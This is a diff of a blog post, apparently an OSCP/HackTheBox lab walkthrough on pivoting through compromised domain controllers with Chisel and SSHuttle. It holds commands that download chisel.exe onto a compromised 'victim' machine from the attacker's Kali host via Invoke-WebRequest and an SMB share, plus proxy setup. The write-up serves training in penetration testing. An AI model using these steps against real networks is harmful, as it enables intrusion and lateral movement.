@@ -15,8 +15,6 @@ tags: HTB OSCP Pivoting
 
 This is a continuation of my Pivoting Basics, and Part 2, and how to use Chisel to pivot. Part 1 dove into what pivoting was, and how to pivot with SSHuttle. In this post, I will continue from where we left off. As a reminder, here is our scenario:
 
-For the following scenario, and for the rest of my walkthroughs, the following will remain true:
-
 + Kali Linux (Attacking Machine): 10.10.15.100
 + First Pivot Machine (Public IP): 10.10.110.10
 + First Network: 172.18.1.0/24
@@ -25,7 +23,7 @@ For the following scenario, and for the rest of my walkthroughs, the following w
 + Third Network: 172.18.3.0/24
 + Third Pivot Machine: 172.18.3.20
 
-We are picking up from where Part 1 left off, with an established SSHuttle session to 172.18.1.0/24. At this point, I will assume you have comrpomised DC01, and have discovered 172.18.2.0/24, with DC02:
+We are picking up from where Part 1 left off, with an established SSHuttle session to 172.18.1.0/24. At this point, I will assume you have comrpomised DC01, and have discovered 172.18.2.0/24:
 
 <img src="/images/posts/pivoting/Pivoting_Part2_Initial.PNG" alt="pivoting-part2-initial" width="700"/>
 
@@ -60,7 +58,7 @@ First, from your Kali machine, with a terminal open to the directory with your c
 python -m http.server 80
 {% endhighlight %}
 
-This will start a web server using port 80 on your Kali machine. From the DC01 victim machine, use PowerSHell's Invoke-WebRequest cmdlet to download chisel.exe:
+This will start a web server using port 80 on your Kali machine. From the DC01 victim machine, use PowerShell's Invoke-WebRequest cmdlet to download chisel.exe:
 
 {% highlight bash linenos %}
 Invoke-WebRequest -URI http://10.10.15.100/chisel.exe -OutFile chisel.exe
@@ -80,7 +78,7 @@ The above starts a smb server on your Kali machine, where:
 + . : This is the directory you wish to share. A period represents the current directory
 + -smb2support : Support for SMBv2
 
-Once this is running, from the DC02 victim machine, copy the chisel.exe file:
+Once this is running, from the DC01 victim machine, copy the chisel.exe file:
 
 {% highlight bash linenos %}
 copy \\10.10.15.100\share\chisel.exe .
@@ -107,11 +105,11 @@ If properly setup, we will have a connection from our client:
 
 Once the client is connected, we can begin to tunnel our traffic into the second network, 172.18.2.0/24, and has access to DC02:
 
-<img src="/images/posts/pivoting/chisel-client.PNG" alt="pivoting-part2-chisel-client" width="500"/>
+<img src="/images/posts/pivoting/chisel-client.PNG" alt="pivoting-part2-chisel-client" width="700"/>
 
 And a connection to our server:
 
-<img src="/images/posts/pivoting/chisel-server.PNG" alt="pivoting-part2-chisel-server" width="500"/>
+<img src="/images/posts/pivoting/chisel-server.PNG" alt="pivoting-part2-chisel-server" width="700"/>
 
 <h3>Using Pivot</h3>
 
@@ -150,7 +148,7 @@ Now that we have our second chisel client connected, we can now hit our final ta
 
 One of the main benefits with Chisel, is the ability to use BurpSuite along with your pivot. This assumes that you already know how to configure your web proxy to send traffic to BurpSuite, such as using FoxyProxy. Once you have your Chisel pivot, you can setup a SOCKS Proxy within BurpSuite, by opening Settings in the top right corner, and opening Network, selecting Connections, and adding the proxy to the SOCKS proxy fields:
 
-Proxy host: 127.0.0.1
+Proxy host: 127.0.0.1\
 Proxy port: 1080 (or 2080, 3080 ... etc)
 
 <img src="/images/posts/pivoting/Pivoting-Part2-BurpSuite.PNG" alt="pivoting-part2-burpsuite" width="800"/>
